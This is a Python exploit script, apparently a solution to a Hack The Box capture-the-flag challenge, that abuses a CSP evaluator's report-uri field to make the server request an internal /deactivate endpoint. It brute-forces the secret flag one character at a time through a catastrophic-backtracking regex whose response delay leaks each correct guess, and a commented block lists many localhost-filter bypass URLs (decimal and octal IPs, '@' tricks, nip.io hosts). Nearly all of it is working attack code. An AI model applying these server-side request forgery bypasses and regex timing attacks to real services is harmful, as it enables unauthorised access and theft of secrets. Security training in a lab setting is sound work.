#!/usr/bin/python3

import os
import re
import string
import requests
import sys
from pwn import *
from pprint import pprint
from time import sleep
from urllib.parse import quote

success = 'Congratulations you managed to stop the rebelion!'
wrong = 'Did you really think you could stop us?'
VALUES = string.ascii_lowercase + string.ascii_uppercase + string.punctuation + "0123456789"
VALUES = [x for x in VALUES]
VALUES.remove("*")
VALUES.remove(".")
VALUES.remove("+")
VALUES.remove("?")
VALUES.remove("|")
VALUES.remove("/")
VALUES.remove("\\")
VALUES.remove("(")
VALUES.remove(")")
VALUES.remove("]")
VALUES.remove("[")
VALUES.remove("}")
VALUES.remove("{")
"""
# The payloads that i've been trying to use 
# to make the bypassing the csp validator

payloads_bypassing = [

    "http://127.0.0.1:1337",
    "http://127.0.0.1:1337",
    "http://127.0.0.1:1337",
    "http://0.0.0.0:1337",
    "https://127.0.0.1:1337",
    "https://localhost:1337",
    "http://2130706433:1337",
    "http://127.127.127.127:1337",
    "http://127.0.1.3:1337",
    "http://0177.0.0.1:1337",
    "http://o177.0.0.1:1337",
    "http://0o177.0.0.1:1337",
    "http://q177.0.0.1:1337",
    "http://127.127.127.127:1337",
    "http://127.0.1.3:1337",
    "http://0/:1337",
    "http://127.1:1337",
    "http://127.0.1:1337",
    "http://127.0.0.1:1337\@127.2.2.2:1337",
    "http://127.0.0.1:1337\@@127.2.2.2:1337",
    "http://127.0.0.1:1337:\@@127.2.2.2:1337",
    "http://127.0.0.1:1337#\@127.2.2.2:1337"
    # "https://localhost:1337",
    # "http://spoofed.burpcollaborator.net",
    # "http://localtest.me",
    # "http://customer1.app.localhost.my.company.127.0.0.1.nip.io:1337",
    # "http://mail.ebc.apple.com:1337",
    # "http://bugbounty.dod.network:1337"
]"""


def host_validator(data):
    for x in data:
        for y in x:
            if x[y] == "Destination not available":
                return True
    return False


def check_environ(data):
    for x in data:
        if x[
            'description'] == 'report-uri directive allows localhost as source. Please make sure to remove this in production environments.':
            return True
    return False


def run_exploit(url):
    x = "http://2130706433:1337"
    p = log.progress("checking for brute force payload: ")
    flag_env: int = 0
    secret_code = ""
    payload = ""
    for count in range(0, 34):
        for cod in VALUES:
            p.status("HTB{" + payload + cod + "}")
            secret_code = "^(?=HTB{" + payload + cod + ".*})((.*)*)*salt$"
            # url_encoded = x+"/deactivate?secretCode=^(?=HTB{"+payload+cod+".*})((.*)*)*salt$"
            url_encoded = x + "/deactivate?secretCode=" + quote(secret_code)
            # url_encoded = x+"/deactivate?secretCode=^(?=HTB{.{"+str(count)+"}})((.*)*)*salt$"
            csp_payload = {
                "csp": "report-uri " + url_encoded
            }
            response = requests.post(url=url + "api/evaluate", json=csp_payload)
            if response.status_code == 200:
                if not host_validator(response.json()[2]['issues']):
                    if check_environ(response.json()[2]['issues']):
                        if response.elapsed.total_seconds() > 2:
                            # flag_env = count
                            # payload.append(cod)
                            payload += cod
                            break
            else:
                log.warn("something went wrong in the post method!!")
    print(payload)


def main():
    try:
        url = sys.argv[1]
        run_exploit(url)
    except Exception as e:
        exit(1)


if __name__ == "__main__":
    main()
